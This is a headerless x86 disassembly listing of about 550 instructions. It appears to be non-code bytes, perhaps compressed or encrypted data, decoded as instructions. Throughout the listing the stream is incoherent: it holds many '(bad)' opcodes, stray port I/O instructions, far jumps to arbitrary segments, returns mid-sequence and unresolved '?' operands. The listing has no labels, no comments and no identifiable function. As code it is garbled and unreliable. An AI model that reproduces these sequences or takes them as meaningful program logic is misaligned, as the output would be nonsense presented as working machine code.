  40df64:	or     eax,0xc2c285d1
  40df69:	mov    dh,0x4
  40df6b:	inc    esi
  40df6c:	je     0x40df9a
  40df6e:	inc    esi
  40df6f:	and    BYTE PTR [ecx],al
  40df71:	sub    eax,DWORD PTR [ebx+0x17]
  40df74:	fimul  DWORD PTR [ebp-0x42e22191]
  40df7a:	push   0x7170b0fa
  40df7f:	ins    DWORD PTR es:[edi],dx
  40df80:	mov    ch,0xb
  40df82:	in     eax,dx
  40df83:	push   ebp
  40df84:	mov    eax,0x4c4cbbc8
  40df89:	clc    
  40df8a:	pop    ebx
  40df8b:	fnsave [ebp+0x5b]
  40df8e:	xor    BYTE PTR [ecx-0x2772ed7],dh
  40df94:	aam    0x74
  40df96:	cdq    
  40df97:	ret    
  40df98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df99:	lea    ebp,[ebp-0x5d]
  40df9c:	mov    BYTE PTR ds:0x810dc505,dl
  40dfa2:	mov    eax,0x1a376d44
  40dfa7:	mov    bh,0x2e
  40dfa9:	sahf   
  40dfaa:	mov    ds:0xe63f9075,al
  40dfaf:	push   es
  40dfb0:	arpl   WORD PTR es:[ebp-0x25],bp
  40dfb4:	mov    dh,0xb6
  40dfb6:	push   eax
  40dfb7:	es add eax,0x2547b177
  40dfbd:	adc    al,0x4d
  40dfbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfc0:	ins    DWORD PTR es:[edi],dx
  40dfc1:	aaa    
  40dfc2:	mov    dh,0xa5
  40dfc4:	jg     0x40df67
  40dfc6:	test   eax,0x8881bde3
  40dfcb:	daa    
  40dfcc:	in     al,dx
  40dfcd:	rcl    BYTE PTR [esi+0x5fb6da16],1
  40dfd3:	int    0x29
  40dfd5:	mov    edi,0x6e45dfce
  40dfda:	clc    
  40dfdb:	shl    dh,1
  40dfdd:	pop    ebp
  40dfde:	fadd   DWORD PTR [edx]
  40dfe0:	or     DWORD PTR [ebp+0x77],edx
  40dfe3:	hlt    
  40dfe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfe5:	cmp    DWORD PTR [eax+0x6858839d],ebx
  40dfeb:	pop    ebx
  40dfec:	sbb    bl,BYTE PTR [ecx-0x32]
  40dfef:	push   ss
  40dff0:	outs   dx,BYTE PTR ds:[esi]
  40dff1:	push   ecx
  40dff2:	mov    ch,0x8d
  40dff4:	or     ebx,DWORD PTR [ebx-0x2c]
  40dff7:	mov    ds:0x7b294604,al
  40dffc:	pop    es
  40dffd:	sbb    BYTE PTR [ebx],0xcb
  40e000:	fild   QWORD PTR [esi]
  40e002:	dec    ebp
  40e003:	std    
  40e004:	and    DWORD PTR [eax-0x6d],ebp
  40e007:	add    BYTE PTR [edi+0x57e900a8],al
  40e00d:	fdivrp st(3),st
  40e00f:	sub    al,0x6d
  40e011:	mov    ch,0xb
  40e013:	out    dx,al
  40e014:	and    al,ah
  40e016:	in     al,dx
  40e017:	mov    ebx,0xb5131d61
  40e01c:	sub    eax,0xf52e2d6d
  40e021:	inc    ebx
  40e022:	mov    ch,0xdd
  40e024:	inc    esp
  40e025:	(bad)  
  40e026:	cdq    
  40e027:	mov    dh,0xed
  40e029:	ret    0xacb6
  40e02c:	adc    ch,BYTE PTR [ebx+esi*8]
  40e02f:	cmp    cl,dh
  40e031:	jae    0x40e080
  40e033:	cmp    edx,DWORD PTR [edi]
  40e035:	stos   BYTE PTR es:[edi],al
  40e036:	ret    0xb5b6
  40e039:	adc    eax,0x5b905f28
  40e03e:	mov    DWORD PTR [edx+eiz*1+0x49],ebx
  40e042:	xchg   ebp,eax
  40e043:	sbb    ch,BYTE PTR [ebx+ebx*8-0x73]
  40e047:	jp     0x40e0a0
  40e049:	add    ah,BYTE PTR [ecx+0x62]
  40e04c:	sbb    esp,DWORD PTR [edx+0x26a168b6]
  40e052:	mov    ds:0xd9a9ec1,eax
  40e057:	pop    eax
  40e058:	pusha  
  40e059:	jmp    0x40e06a
  40e05b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e05c:	or     BYTE PTR [eax+0xb9040a2],dh
  40e062:	pop    ebx
  40e063:	mov    ebx,0xddf11d6d
  40e068:	in     eax,0xad
  40e06a:	jge    0x40e089
  40e06c:	data16 or cl,BYTE PTR [ebx]
  40e06f:	and    al,0xb6
  40e072:	ins    DWORD PTR es:[edi],dx
  40e073:	xchg   ebp,eax
  40e074:	call   DWORD PTR [ebx+0x1a]
  40e077:	mov    ecx,0x585d38e7
  40e07c:	push   0x5c5646bb
  40e081:	je     0x40e08a
  40e083:	pop    es
  40e084:	jl     0x40e05b
  40e086:	or     esi,DWORD PTR [edi-0xd4f4a53]
  40e08c:	mov    bl,0xf1
  40e08e:	pop    eax
  40e08f:	hlt    
  40e090:	das    
  40e091:	aas    
  40e092:	out    dx,eax
  40e093:	push   es
  40e094:	popa   
  40e095:	pop    eax
  40e096:	push   0x8a4b1a37
  40e09b:	add    dl,ah
  40e09d:	push   eax
  40e09e:	in     eax,0x59
  40e0a0:	ins    DWORD PTR es:[edi],dx
  40e0a1:	fistp  DWORD PTR [eax+0x58]
  40e0a4:	push   edx
  40e0a5:	jnp    0x40e09e
  40e0a7:	sahf   
  40e0a8:	imul   edx,DWORD PTR [edx+0x38],0xb616f8de
  40e0af:	test   DWORD PTR [ebp-0x290e303],eax
  40e0b5:	push   0x14
  40e0b7:	mov    dh,0xe2
  40e0b9:	sub    al,0x16
  40e0bb:	mov    dh,0x6d
  40e0bd:	(bad)  
  40e0bf:	imul   ebx,ebp,0x9
  40e0c2:	sub    al,0x62
  40e0c4:	mov    al,0xcd
  40e0c6:	push   edx
  40e0c7:	shl    DWORD PTR [edi],cl
  40e0c9:	push   ss
  40e0ca:	retf   0xbf85
  40e0cd:	jae    0x40e0a9
  40e0cf:	inc    ebx
  40e0d0:	retf   0x5e18
  40e0d3:	les    esp,FWORD PTR [ebx+0x61]
  40e0d6:	arpl   WORD PTR [ebx-0x6b],bp
  40e0d9:	repnz or DWORD PTR [eax+0x1898cd0f],ebp
  40e0e0:	mov    dh,0xb1
  40e0e2:	jge    0x40e155
  40e0e4:	push   esp
  40e0e5:	push   0xffffff93
  40e0e7:	pop    esp
  40e0e8:	xor    eax,0x1d514bd1
  40e0ed:	mov    eax,0x35edb6d0
  40e0f2:	mov    ebp,0xcfb28711
  40e0f7:	sbb    bl,BYTE PTR [edi]
  40e0f9:	push   ds
  40e0fa:	ins    BYTE PTR es:[edi],dx
  40e0fb:	mov    ds:0x60db7976,al
  40e100:	inc    ebp
  40e101:	or     BYTE PTR [eax-0x484d8300],bl
  40e107:	mov    esp,0xda9f43d4
  40e10c:	cmp    cl,al
  40e10e:	and    al,0xc9
  40e110:	jmp    0xc16d:0xc6c256a7
  40e117:	repz mov al,ds:0xcaa64d48
  40e11d:	inc    DWORD PTR [eax*4-0x3bab292e]
  40e124:	cmp    al,0x43
  40e126:	and    BYTE PTR [ecx+0x42c15c09],0xbb
  40e12d:	shr    BYTE PTR [ebp-0x25be65e5],0xd3
  40e134:	arpl   WORD PTR [ebx],ax
  40e136:	pop    eax
  40e137:	push   0x6e0653ad
  40e13c:	pop    ebx
  40e13d:	jmp    0x2e42:0xc2ed6dbf
  40e144:	mov    dh,ah
  40e146:	lock imul ebx,ebp,0x89b66595
  40e14d:	mov    eax,0xb3c8bfb4
  40e152:	clc    
  40e153:	das    
  40e154:	xlat   BYTE PTR ds:[ebx]
  40e155:	js     0x40e13f
  40e157:	push   eax
  40e158:	or     esp,DWORD PTR [ebp+0x5c73dad8]
  40e15e:	jp     0x40e14b
  40e160:	push   ebp
  40e161:	adc    BYTE PTR [edx],dl
  40e163:	mov    al,ds:0xf7b42e89
  40e168:	mov    bl,0x46
  40e16a:	xchg   ebp,eax
  40e16b:	test   al,0x7b
  40e16d:	jmp    FWORD PTR [ebp+0x5b]
  40e170:	pop    ebx
  40e171:	or     DWORD PTR [edx+0x6e],ecx
  40e174:	jne    0x40e180
  40e176:	sbb    eax,0xc68d47cb
  40e17b:	repnz aaa 
  40e17d:	xchg   BYTE PTR [ecx+0x94c700],cl
  40e183:	aas    
  40e184:	cmp    al,0x1b
  40e186:	pop    ebp
  40e187:	dec    eax
  40e188:	pop    ebx
  40e189:	sbb    eax,0x7cbd85d0
  40e18e:	sub    eax,0x3769f40c
  40e193:	pusha  
  40e194:	push   0x86b615bb
  40e199:	mov    esp,0x2e0b1c9d
  40e19e:	out    dx,al
  40e19f:	lods   eax,DWORD PTR ds:[esi]
  40e1a0:	or     BYTE PTR [esi-0x2b825e93],dh
  40e1a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a7:	sti    
  40e1a8:	in     al,dx
  40e1a9:	cli    
  40e1aa:	and    eax,0xd9ce5d11
  40e1af:	jle    0x40e212
  40e1b1:	imul   edx,DWORD PTR [edi-0x4641b39b],0x6b
  40e1b8:	shr    DWORD PTR [ebx],1
  40e1ba:	aas    
  40e1bb:	fld    QWORD PTR [eax]
  40e1bd:	lods   al,BYTE PTR ds:[esi]
  40e1be:	jmp    0x40e217
  40e1c0:	mov    edi,0x523256db
  40e1c5:	loopne 0x40e166
  40e1c7:	xlat   BYTE PTR ds:[ebx]
  40e1c8:	sub    DWORD PTR [ebx-0x2f],edx
  40e1cb:	jecxz  0x40e230
  40e1cd:	push   ebx
  40e1ce:	rcl    al,1
  40e1d0:	push   esi
  40e1d1:	mov    ecx,0x50e23072
  40e1d6:	mov    ah,0x5
  40e1d8:	push   edi
  40e1d9:	dec    ebx
  40e1da:	ins    DWORD PTR es:[edi],dx
  40e1db:	and    al,0xef
  40e1dd:	in     al,dx
  40e1de:	inc    esp
  40e1df:	and    ecx,DWORD PTR [eax-0x55ea44be]
  40e1e5:	shl    BYTE PTR [eax],0x92
  40e1e8:	iret   
  40e1e9:	scas   eax,DWORD PTR es:[edi]
  40e1ea:	enter  0xf05b,0xa9
  40e1ee:	dec    ebx
  40e1ef:	fistp  DWORD PTR [esi]
  40e1f1:	sub    DWORD PTR [edi+0x3fed1c8f],esi
  40e1f7:	lock push esp
  40e1f9:	ins    DWORD PTR es:[edi],dx
  40e1fa:	arpl   WORD PTR [ebx-0x5f],sp
  40e1fd:	lods   al,BYTE PTR ds:[esi]
  40e1fe:	fsubr  st(3),st
  40e200:	mov    ebp,0x263521f9
  40e205:	inc    esi
  40e206:	add    eax,eax
  40e208:	test   DWORD PTR [edx],edi
  40e20a:	add    DWORD PTR [esi+0x70],ebx
  40e20d:	mov    ds:0xadc11e86,eax
  40e212:	(bad)  
  40e213:	aam    0xec
  40e215:	test   al,0x11
  40e217:	inc    esp
  40e218:	mov    esi,0x56ed71f4
  40e21d:	outs   dx,BYTE PTR ds:[esi]
  40e21e:	dec    ebp
  40e21f:	js     0x40e291
  40e221:	gs cs or al,0x2f
  40e225:	xchg   ebp,eax
  40e226:	and    BYTE PTR fs:[ebx-0x5c4ae492],ah
  40e22d:	lods   eax,DWORD PTR ds:[esi]
  40e22e:	(bad)  
  40e22f:	sub    BYTE PTR [ecx],dl
  40e231:	popf   
  40e232:	cmp    ebp,ebp
  40e234:	fcomp  st(2)
  40e236:	test   DWORD PTR [esi-0x44fdbeb7],esi
  40e23c:	or     BYTE PTR [ebp-0x62],al
  40e23f:	mov    eax,ds:0xdca161ca
  40e244:	ss sub al,0x14
  40e247:	inc    edi
  40e248:	daa    
  40e249:	jp     0x40e1f7
  40e24b:	jle    0x40e278
  40e24d:	sbb    ebx,DWORD PTR ds:0x44466dc5
  40e253:	retf   
  40e254:	shr    DWORD PTR [ecx+ebx*1],cl
  40e257:	push   edi
  40e258:	jmp    0x40e2c9
  40e25a:	mov    ebx,0x13f31ba8
  40e25f:	add    eax,0x144e1639
  40e264:	imul   eax,DWORD PTR [eax],0xb0b1b8b7
  40e26a:	sub    eax,0xa3155981
  40e26f:	call   0xb13bc72b
  40e274:	inc    esp
  40e275:	mov    ebx,0xdd8221d0
  40e27a:	and    DWORD PTR [edx-0x4b5233a2],ebp
  40e280:	sar    BYTE PTR [edx+0x49ffa91c],1
  40e286:	sbb    BYTE PTR [eax+0x4a],0x66
  40e28a:	lea    esi,[esi+0x61]
  40e28d:	imul   esi,DWORD PTR [edx+edi*2-0x17],0x64
  40e292:	es pop eax
  40e294:	push   0x8dc41d48
  40e299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e29a:	xchg   ebx,eax
  40e29b:	je     0x40e2ff
  40e29d:	data16 and al,0xb2
  40e2a0:	sub    ch,cl
  40e2a2:	sbb    esp,DWORD PTR [ebp+0x42838d1b]
  40e2a8:	or     al,0x88
  40e2aa:	mov    cl,0x2c
  40e2ac:	fidivr WORD PTR [ebx]
  40e2ae:	outs   dx,BYTE PTR ds:[esi]
  40e2af:	mov    ah,0x8d
  40e2b1:	or     esp,DWORD PTR [ebp+esi*2+0x6e]
  40e2b5:	cdq    
  40e2b6:	bound  edx,QWORD PTR [eax+0x75]
  40e2b9:	push   ebp
  40e2ba:	leave  
  40e2bb:	mov    al,ds:0x9116d6ed
  40e2c0:	add    DWORD PTR ds:0x479d49c5,ebx
  40e2c6:	cmp    DWORD PTR [ebx-0x7dc6ef4b],0xc58ba0c1
  40e2d0:	inc    edx
  40e2d1:	loopne 0x40e2ed
  40e2d3:	add    bl,bl
  40e2d5:	inc    edx
  40e2d6:	jns    0x40e325
  40e2d8:	or     edx,DWORD PTR [ebp+0x6a5c03de]
  40e2de:	xchg   edi,eax
  40e2df:	sti    
  40e2e0:	enter  0x142e,0xe6
  40e2e4:	sub    eax,0x2d2a011
  40e2e9:	icebp  
  40e2ea:	push   0xf1196c98
  40e2ef:	cmp    BYTE PTR ss:[esi],dh
  40e2f2:	sbb    bl,BYTE PTR [ebx-0x40]
  40e2f5:	data16 (bad) 
  40e2f7:	out    dx,eax
  40e2f8:	test   al,0x48
  40e2fa:	jb     0x40e333
  40e2fc:	push   ss
  40e2fd:	ss push ss
  40e2ff:	in     eax,0xf7
  40e301:	loope  0x40e320
  40e303:	pop    eax
  40e304:	push   esi
  40e305:	test   al,0xc3
  40e307:	sub    eax,0x6d5346e1
  40e30c:	in     al,dx
  40e30d:	fcomp  QWORD PTR ds:0x44d1bd08
  40e313:	mov    gs,WORD PTR [ebx+0xb]
  40e316:	lods   eax,DWORD PTR ds:[esi]
  40e317:	push   edx
  40e318:	cmp    BYTE PTR [esi+0x76],ah
  40e31b:	sub    ecx,DWORD PTR [ecx-0x7249e99e]
  40e321:	jbe    0x40e322
  40e323:	cmp    bl,BYTE PTR [ebx+0x7b8c4500]
  40e329:	inc    esi
  40e32a:	pop    es
  40e32b:	mov    eax,ds:0xb0d8da5d
  40e330:	cwde   
  40e331:	jmp    0x7c38:0xa0c1a1b0
  40e338:	mov    bh,0x85
  40e33a:	jbe    0x40e3a7
  40e33c:	jbe    0x40e38a
  40e33e:	(bad)  
  40e33f:	xchg   ebx,eax
  40e340:	cmc    
  40e341:	mov    bl,ah
  40e343:	fld    QWORD PTR [esi-0x50]
  40e346:	adc    dl,BYTE PTR [edi+0x2c100a96]
  40e34c:	pop    ss
  40e34d:	add    eax,0xb4a31c2c
  40e352:	lods   eax,DWORD PTR ds:[esi]
  40e353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e354:	fidivr DWORD PTR [ebx-0x50c01ec4]
  40e35a:	push   0x59
  40e35c:	lods   eax,DWORD PTR ds:[esi]
  40e35d:	and    eax,0x6c951b0c
  40e362:	(bad)  
  40e363:	sub    BYTE PTR [ebx],ch
  40e365:	jg     0x40e332
  40e367:	outs   dx,DWORD PTR ds:[esi]
  40e368:	cs mov dh,0xd5
  40e36b:	dec    edx
  40e36c:	not    ebp
  40e36e:	xchg   edx,eax
  40e36f:	mov    dl,0x30
  40e371:	add    BYTE PTR [ecx+0x64],bl
  40e374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e375:	mov    bh,0xb6
  40e377:	jno    0x40e3e4
  40e379:	mov    ecx,0xf69765d1
  40e37e:	xor    eax,0x8896b6ef
  40e383:	stos   BYTE PTR es:[edi],al
  40e384:	jbe    0x40e361
  40e386:	pop    edx
  40e387:	ins    DWORD PTR es:[edi],dx
  40e388:	or     BYTE PTR [edi-0xafc52c2],dl
  40e38e:	pop    ebx
  40e38f:	stc    
  40e390:	pop    ss
  40e391:	xchg   esi,eax
  40e392:	aad    0xe0
  40e394:	lods   al,BYTE PTR ds:[esi]
  40e395:	sbb    BYTE PTR [eax],al
  40e397:	push   edi
  40e398:	xchg   ecx,eax
  40e399:	add    BYTE PTR ds:0xe8ae8919,al
  40e39f:	mov    dh,0x2d
  40e3a1:	ins    BYTE PTR es:[edi],dx
  40e3a2:	mov    eax,ds:0xc26f825e
  40e3a7:	shr    BYTE PTR [ecx],1
  40e3a9:	pop    edx
  40e3aa:	pusha  
  40e3ab:	lods   eax,DWORD PTR ds:[esi]
  40e3ac:	fstp   st(2)
  40e3ae:	sbb    dh,BYTE PTR cs:[edx+0x57]
  40e3b2:	adc    al,0xa7
  40e3b4:	das    
  40e3b5:	in     eax,dx
  40e3b6:	cmp    ebp,DWORD PTR [ebx-0x4924927b]
  40e3bc:	push   0x17
  40e3be:	xchg   esi,eax
  40e3bf:	mov    esi,eax
  40e3c1:	retf   
  40e3c2:	mov    BYTE PTR [ebp+0x176bbb90],dl
  40e3c8:	or     dh,BYTE PTR [edi+0x7e798c74]
  40e3ce:	xchg   ecx,eax
  40e3cf:	cmp    eax,0xad47ff6e
  40e3d4:	stc    
  40e3d5:	(bad)  
  40e3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3d7:	ins    DWORD PTR es:[edi],dx
  40e3d8:	pop    edx
  40e3d9:	jno    0x40e42e
  40e3db:	xor    eax,0xf809bc71
  40e3e0:	add    BYTE PTR [ebp-0x2bd48986],al
  40e3e6:	push   edx
  40e3e7:	sub    DWORD PTR [ebx],ecx
  40e3e9:	and    bl,BYTE PTR [ecx-0x7c]
  40e3ec:	fwait
  40e3ed:	mov    eax,ds:0xb6836d6e
  40e3f2:	into   
  40e3f3:	lock jg 0x40e3a7
  40e3f6:	inc    edi
  40e3f7:	adc    al,0x8a
  40e3f9:	xor    DWORD PTR [eax+edx*8],ebp
  40e3fc:	push   ss
  40e3fd:	ss pusha 
  40e3ff:	out    0x6d,eax
  40e401:	push   es
  40e402:	ja     0x40e47c
  40e404:	mov    ds,ebx
  40e406:	push   es
  40e407:	mov    esp,0x8d43fc6e
  40e40c:	aaa    
  40e40d:	sub    eax,0x53ccc5ef
  40e412:	dec    ebp
  40e413:	icebp  
  40e414:	mov    eax,ds:0x1b12654f
  40e419:	pop    ds
  40e41a:	test   BYTE PTR [ebp+0x5adc55d],0x3d
  40e421:	loope  0x40e3b4
  40e423:	xchg   ebp,eax
  40e424:	sbb    ecx,edi
  40e426:	fucomip st,st(5)
  40e428:	ret    0xb56
  40e42b:	out    dx,al
  40e42c:	in     eax,dx
  40e42d:	sbb    esp,DWORD PTR gs:[ecx-0x16]
  40e431:	pop    edi
  40e432:	out    0x8a,al
  40e434:	test   DWORD PTR [ebx],ebx
  40e436:	pop    ebx
  40e437:	in     eax,0x1e
  40e439:	fcom   DWORD PTR [eax-0xd]
  40e43c:	jg     0x40e4bd
  40e43e:	inc    esp
  40e43f:	dec    ebx
  40e440:	pop    ss
  40e441:	sbb    bl,dh
  40e443:	xor    edi,ebp
  40e445:	xor    al,BYTE PTR [edi-0x7d]
  40e448:	mov    ch,BYTE PTR [eax+eax*1+0x2e]
  40e44c:	jne    0x40e49f
  40e44e:	mov    esp,0x5a225f35
  40e453:	push   edx
  40e454:	or     eax,0x5db52eb
  40e459:	scas   al,BYTE PTR es:[edi]
  40e45a:	outs   dx,DWORD PTR ds:[esi]
  40e45b:	retf   0x5cb3
  40e45e:	adc    BYTE PTR [esi+0x61],bh
  40e461:	mov    eax,0xff656db4
  40e466:	mov    DWORD PTR [ecx+0x5c],esp
  40e469:	out    dx,eax
  40e46a:	lods   eax,DWORD PTR ds:[esi]
  40e46b:	jne    0x40e414
  40e46d:	(bad)  
  40e46e:	mov    eax,0xeb258d0
  40e473:	and    al,0xc4
  40e475:	and    al,0xae
  40e477:	pop    ss
  40e478:	xchg   ebp,eax
  40e479:	retf   
  40e47a:	lea    esp,[esi-0x2ad30e16]
  40e480:	test   eax,0x277efcd8
  40e485:	(bad)  
  40e486:	shr    BYTE PTR [ebp+0x6b],cl
  40e489:	xchg   ebp,eax
  40e48a:	add    bl,BYTE PTR [ebp-0x71]
  40e48d:	(bad)  
  40e48e:	sbb    eax,0xdc6a4ea9
  40e493:	fcmovb st,st(2)
  40e495:	and    DWORD PTR [esi-0x60],0x737759d0
  40e49c:	jns    0x40e50d
  40e49e:	ret    0xbb46
  40e4a1:	popa   
  40e4a2:	cmc    
  40e4a3:	sbb    esp,DWORD PTR [ebp+0x2a]
  40e4a6:	loopne 0x40e49b
  40e4a8:	rol    BYTE PTR [edi],1
  40e4aa:	cs sub eax,0x5044db6c
  40e4b0:	or     BYTE PTR [ebx+0x41963184],al
  40e4b6:	pop    es
  40e4b7:	je     0x40e44f
  40e4b9:	add    eax,0xaf7c156e
  40e4be:	imul   bx,si,0x39
  40e4c2:	ret    0x1636
  40e4c5:	or     dl,ch
  40e4c7:	push   cs
  40e4c8:	pop    esi
  40e4c9:	add    DWORD PTR [ecx+0x33],edx
  40e4cc:	push   esi
  40e4cd:	rcl    DWORD PTR [edx+0x7],1
  40e4d0:	fcom   QWORD PTR [esi-0x53]
  40e4d3:	sub    eax,0x88fbc7c0
  40e4d8:	std    
  40e4d9:	bound  edi,QWORD PTR [ebx+0x677710b5]
  40e4df:	(bad)  
  40e4e0:	and    edx,DWORD PTR [ecx]
  40e4e2:	dec    ebx
  40e4e3:	push   DWORD PTR [eax+ebx*4]
  40e4e6:	mov    bh,0xa5
  40e4e8:	ins    DWORD PTR es:[edi],dx
  40e4e9:	test   eax,0x2c42b908
  40e4ee:	sti    
  40e4ef:	retf   
  40e4f0:	nop
  40e4f1:	push   cs
  40e4f2:	or     DWORD PTR [ecx+0x6da3696d],ebx
  40e4f8:	cmp    DWORD PTR [ebp+0x35],0xffffff8d
  40e4fc:	out    0x38,eax
  40e4fe:	fs enter 0xb7fc,0x85
  40e503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e504:	dec    esi
  40e505:	sahf   
  40e506:	sbb    al,0x1f
  40e508:	and    eax,0x3d940e
  40e50d:	aam    0x61
  40e50f:	add    BYTE PTR [eax],dh
  40e511:	and    al,0xb7
  40e513:	(bad)  
  40e514:	push   edi
  40e515:	mov    ah,0xb8
  40e517:	and    dl,BYTE PTR [ecx-0x49]
  40e51a:	pop    ecx
  40e51b:	or     esi,DWORD PTR ds:0x68ddab76
  40e521:	imul   ecx,DWORD PTR [edi+ecx*1],0xb
  40e525:	retf   
  40e526:	popa   
  40e527:	add    ebp,DWORD PTR [ecx+0xb]
  40e52a:	mov    dh,0xb6
  40e52c:	test   DWORD PTR [ebp-0x205cd1d2],ebp
  40e532:	sti    
  40e533:	adc    dh,ah
  40e535:	lods   al,BYTE PTR ds:[esi]
  40e536:	lea    esi,[esi+0x719bdb71]
  40e53c:	mov    al,0xe2
  40e53e:	or     BYTE PTR [ebx+0x3b],0x38
  40e542:	jmp    0xe91d:0xb7685858
  40e549:	outs   dx,BYTE PTR ds:[esi]
  40e54a:	inc    ecx
  40e54b:	sti    
  40e54c:	xchg   esp,eax
  40e54d:	and    BYTE PTR [esi+0x76ff2895],bh
  40e553:	pop    ebx
  40e554:	icebp  
  40e555:	mov    cl,0x62
  40e557:	jmp    0x13c9b5e
  40e55c:	jp     0x40e50b
  40e55e:	add    dl,ch
  40e560:	inc    ecx
  40e561:	arpl   WORD PTR [ecx-0x2377a5a3],bp
  40e567:	jmp    0x8c5b0680
  40e56c:	push   0xffffffb1
  40e56e:	pop    ss
  40e56f:	mov    dh,0x72
  40e571:	imul   esi,eax,0x8f53c9e
  40e577:	loop   0x40e5e3
  40e579:	shr    edx,0xb5
  40e57c:	mov    ?,WORD PTR [esi+0x59098c6d]
  40e582:	mov    esp,0x71a4572c
  40e587:	stc    
  40e588:	mov    dh,0x89
  40e58a:	mov    eax,0xecf9fd53
  40e58f:	jbe    0x40e529
  40e591:	cmp    BYTE PTR [ecx-0x25358200],ah
  40e597:	cs ins DWORD PTR es:[edi],dx
  40e599:	pop    ebx
  40e59a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e59b:	inc    eax
  40e59c:	fistp  WORD PTR es:[eax-0x7d5befcf]
  40e5a3:	lods   eax,DWORD PTR ds:[esi]
  40e5a4:	ins    DWORD PTR es:[edi],dx
  40e5a5:	mov    bh,0x26
  40e5a7:	test   al,0xe8
  40e5a9:	pop    esp
  40e5aa:	lahf   
  40e5ab:	mov    dh,0xbc
  40e5ad:	fist   DWORD PTR [ebp+0x4ab617a1]
  40e5b3:	(bad)  
  40e5b5:	sahf   
  40e5b6:	jp     0x40e62e
  40e5b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5b9:	div    DWORD PTR [edx]
  40e5bb:	push   edx
  40e5bc:	jne    0x40e5a0
  40e5be:	popa   
  40e5bf:	test   eax,0xddeb0add
  40e5c4:	dec    edi
  40e5c5:	mov    cl,0x1a
  40e5c7:	ja     0x40e5de
  40e5c9:	jae    0x40e59c
  40e5cb:	test   al,0xad
  40e5cd:	jne    0x40e553
  40e5cf:	ficom  WORD PTR [eax]
  40e5d1:	pop    ecx
  40e5d2:	lds    ecx,FWORD PTR [edx-0x449293d3]
  40e5d8:	mov    edx,0x46dafcd0
  40e5dd:	pop    esp
  40e5de:	lds    ecx,FWORD PTR [edi-0x1ebf4ae1]
  40e5e4:	inc    esi
  40e5e5:	mov    ebx,0xce6439ad
  40e5ea:	shr    BYTE PTR [ebx-0x4927867c],0x8d
  40e5f1:	push   edx
  40e5f2:	and    bh,BYTE PTR [ecx]
  40e5f4:	(bad)  
  40e5f5:	(bad)  
  40e5f6:	sbb    ah,BYTE PTR [eax]
  40e5f8:	add    ch,0xb6
  40e5fb:	je     0x40e5d8
  40e5fd:	arpl   WORD PTR [eax-0x25b68d68],di
  40e603:	xchg   BYTE PTR [edx+0x6e87a5b9],ch
  40e609:	or     eax,0x63831678
  40e60e:	mov    eax,ds:0x6d6209f5
  40e613:	mov    eax,DWORD PTR [ebp-0x515b6c5b]
  40e619:	sbb    DWORD PTR [eax+0x631d9906],edx
  40e61f:	adc    eax,DWORD PTR [eax-0x49]
  40e622:	jl     0x40e5a7
  40e624:	mov    ecx,0x13b765c3
  40e629:	jmp    0x29e5:0x56e36d6d
  40e630:	ror    edi,0x4d
  40e633:	inc    esp
  40e634:	mov    WORD PTR [eax-0x16],?
  40e637:	push   edx
  40e638:	pop    ebx
  40e639:	mov    eax,0x585a0b3b
  40e63e:	adc    al,0xce
  40e640:	pop    ecx
  40e641:	push   esp
  40e642:	or     esi,DWORD PTR [ebx+ebp*2-0x65]
  40e646:	test   al,0x5e
  40e648:	add    cl,BYTE PTR [eax+0x71]
  40e64b:	out    0xd7,al
  40e64d:	lds    esi,FWORD PTR [esi-0x3a549e8a]
  40e653:	rol    DWORD PTR [ebx+0x5e],0xd5
  40e657:	and    ecx,DWORD PTR [eax]
  40e659:	push   eax
  40e65a:	dec    esi
  40e65b:	pop    ss
  40e65c:	mov    dh,0xb6
  40e65e:	push   ss
  40e65f:	xor    DWORD PTR [edi+0x3a],esi
  40e662:	pop    ss
  40e663:	cs imul edx,esi,0xbb423096
  40e66a:	xor    eax,0xe0a18105
  40e66f:	inc    ebx
  40e670:	sub    BYTE PTR [ebx+eax*2-0x25],dh
  40e674:	rcl    BYTE PTR [esi-0x1d],cl
  40e677:	shl    DWORD PTR [edi],1
  40e679:	js     0x40e6f7
  40e67b:	add    ecx,ebp
  40e67d:	pop    esi
  40e67e:	add    ch,BYTE PTR [ecx+0x2e]
  40e681:	ins    DWORD PTR es:[edi],dx
  40e682:	dec    ebx
  40e683:	sbb    edi,DWORD PTR [edx-0x79ba2872]
  40e689:	into   
  40e68a:	into   
  40e68b:	dec    ebx
  40e68c:	fnstenv [ebp+0x429844b]
  40e692:	inc    ecx
  40e693:	jnp    0x40e63e
  40e695:	jecxz  0x40e6e9
  40e697:	mov    ebx,0x313bb1b5
  40e69c:	add    ch,ch
  40e69e:	test   DWORD PTR [esi+0x25],eax
  40e6a1:	xchg   ebp,eax
  40e6a2:	xor    BYTE PTR [esi+0x21c0b0b0],0xc6
  40e6a9:	(bad)  [esi-0x19c135b8]
  40e6af:	fcomp  DWORD PTR [edx+0x6b]
  40e6b2:	in     eax,dx
  40e6b3:	scas   eax,DWORD PTR es:[edi]
  40e6b4:	push   ebp
  40e6b5:	pop    edi
  40e6b6:	inc    ecx
  40e6b7:	and    DWORD PTR [edx],ebx
  40e6b9:	or     BYTE PTR [edx],cl
  40e6bb:	mov    bh,0xb2
  40e6bd:	fstp   st(2)
  40e6bf:	sub    bl,BYTE PTR [edx-0x404d0cde]
  40e6c5:	fistp  DWORD PTR [ebx+0x2c2e3add]
  40e6cb:	jne    0x40e70d
  40e6cd:	int    0xd8
  40e6cf:	rol    esi,1
  40e6d1:	sub    ecx,DWORD PTR ds:0x3a0e69c
  40e6d7:	mov    dh,0x9a
  40e6d9:	jne    0x40e705
  40e6db:	mov    dl,0x1d
  40e6dd:	ror    DWORD PTR [ebp+0x56d4d68d],1
  40e6e3:	loope  0x40e6f4
  40e6e5:	jge    0x40e668
  40e6e7:	lods   al,BYTE PTR ds:[esi]
  40e6e8:	nop
  40e6e9:	mov    dh,0x85
